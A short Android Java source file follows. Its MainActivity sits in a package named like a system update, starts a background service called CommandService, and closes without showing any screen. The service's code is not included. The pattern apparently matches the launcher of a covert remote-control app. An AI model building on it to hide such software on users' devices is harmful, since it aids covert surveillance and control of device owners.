package com.sys.update;
import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(new Intent(this, CommandService.class));
        else startService(new Intent(this, CommandService.class));
        finish();
    }
}
